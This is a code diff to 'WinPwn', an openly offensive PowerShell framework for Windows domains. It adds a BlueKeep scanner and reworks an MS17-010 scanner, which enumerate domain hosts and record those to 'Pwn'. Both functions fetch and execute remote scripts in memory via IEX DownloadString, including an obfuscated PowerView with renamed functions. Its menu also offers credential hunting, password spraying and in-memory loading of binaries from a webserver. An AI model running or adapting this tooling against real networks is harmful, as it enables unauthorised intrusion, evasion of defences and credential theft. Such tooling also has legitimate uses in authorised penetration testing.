@@ -1097,7 +1097,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '6. Search for MS17-10 vulnerable Windows Servers in the domain! '
         Write-Host -ForegroundColor Green '7. Check Domain Network-Shares for cleartext passwords using passhunt.exe! '
         Write-Host -ForegroundColor Green '8. Check domain Group policies for common misconfigurations using Grouper2! '
-        Write-Host -ForegroundColor Green '9. Exit. '
+        Write-Host -ForegroundColor Green '9. Search for bluekeep vulnerable Windows Systems in the domain! '
+        Write-Host -ForegroundColor Green '10. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1111,9 +1112,10 @@ __        ___       ____
              6{MS17-10}
              7{passhunt -domain $true}
              8{GPOAudit}
+             9{bluekeep}
        }
     }
- While ($masterquestion -ne 9)
+ While ($masterquestion -ne 10)
 }
 
 function GPOAudit
@@ -1141,6 +1143,73 @@ function reconAD
     cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
 }
 
+function bluekeep
+{
+<#
+        .DESCRIPTION
+        Search AD for pingable Windows servers and Check if they are vulnerable to bluekeep.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Domain Recon / Lateral Movement / Exploitation Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/bluekeepscan.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    $serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'
+    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
+    {
+	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
+    {
+        Write-Host -ForegroundColor Yellow "Found an existing Server list, using this one instead of generating a new one!"
+        $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Servers.txt"
+    }
+    else
+    {
+        Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
+	    $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
+        $ActiveServers = $ActiveServers.dnshostname
+        $ActiveServers >> "$currentPath\DomainRecon\Windows_Servers.txt"
+    }
+	foreach ($acserver in $ActiveServers)
+        {
+		try{
+         	if (bluekeepscan -target $acserver)
+                {
+                	Write-Host -ForegroundColor Yellow 'Found vulnerable Server, putting it to .\VUlnerabilities\bluekeep_VulnerableServers.txt!'
+                    echo "$acserver" >> "$currentPath\Vulnerabilities\bluekeep_VulnerableServers.txt"
+                }
+		}catch{Write-Host "Got an error"}
+        }
+    }
+    else
+    {
+       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
+        {
+            Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
+            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
+        }
+        else
+        {
+            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
+	        $ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
+            $ActiveServers = $ActiveServers.dnshostname
+            $ActiveServers >> "$currentPath\DomainRecon\Windows_Systems.txt"
+        }
+	    foreach ($acserver in $ActiveServers)
+            {
+		    try{
+         	    if (bluekeepscan -target $acserver)
+                    {
+                	    Write-Host -ForegroundColor Yellow "Found vulnerable System - $acserver. Just Pwn it!"
+                            echo "$acserver" >> "$currentPath\Vulnerabilities\bluekeep_VulnerableSystems.txt"
+                    }
+		    }catch{Write-Host "Got an error"}
+        }
+    }
+
+}
+
 function MS17-10
 {
 <#
@@ -1150,20 +1219,31 @@ function MS17-10
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement / Exploitation Phase
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ms17-10.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
     $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
     if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
     {
-	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
-	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-	foreach ($acserver in $ActiveServers.dnshostname)
+	    if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
+        {
+            Write-Host -ForegroundColor Yellow "Found an existing Server list, using this one instead of generating a new one!"
+            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Servers.txt"
+        }
+        else
+        {
+            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
+	        $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
+            $ActiveServers = $ActiveServers.dnshostname
+            $ActiveServers >> "$currentPath\DomainRecon\Windows_Servers.txt"
+        }
+	foreach ($acserver in $ActiveServers)
         {
 		try{
          	if (Scan-MS17-10 -target $acserver)
                 {
-                	Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. Just Pwn this system!'
+                	Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. Just Pwn this system!"
                         echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableServers.txt"
                 }
 		}catch{Write-Host "Got an error"}
@@ -1171,9 +1251,19 @@ function MS17-10
     }
     else
     {
-    	Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
-	$ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
-	foreach ($acserver in $ActiveServers.dnshostname)
+       	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
+        {
+            Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
+            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
+        }
+        else
+        {
+            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
+	        $ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
+            $ActiveServers = $ActiveServers.dnshostname
+            $ActiveServers >> "$currentPath\DomainRecon\Windows_Systems.txt"
+        }
+	foreach ($acserver in $ActiveServers)
         {
 		try{
          	if (Scan-MS17-10 -target $acserver)
@@ -1968,11 +2058,12 @@ __        ___       ____
         Write-Host -ForegroundColor Green '16. ADRecon Report! '
         Write-Host -ForegroundColor Green '17. Search for potential vulnerable web apps (low hanging fruits)! '
         Write-Host -ForegroundColor Green '18. Find some network shares! '
-	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
-	Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
+	    Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
+	    Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
     	Write-Host -ForegroundColor Green '21. Do an Group Policy Audit using Grouper2!'
-	Write-Host -ForegroundColor Green '22. DomainPasswordSpray Attacks!'
-        Write-Host -ForegroundColor Green '23. Exit. '
+	    Write-Host -ForegroundColor Green '22. DomainPasswordSpray Attacks!'
+        Write-Host -ForegroundColor Green '23. Bluekeep scanner for domain joined Windows Systems! '
+        Write-Host -ForegroundColor Green '24. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2000,9 +2091,10 @@ __        ___       ____
 	    20{sharpcradle}
             21{GPOAudit}
 	    22{domainpassspray}
+            23{bluekeep}
        }
     }
- While ($masterquestion -ne 23)
+ While ($masterquestion -ne 24)
      
     
     #End
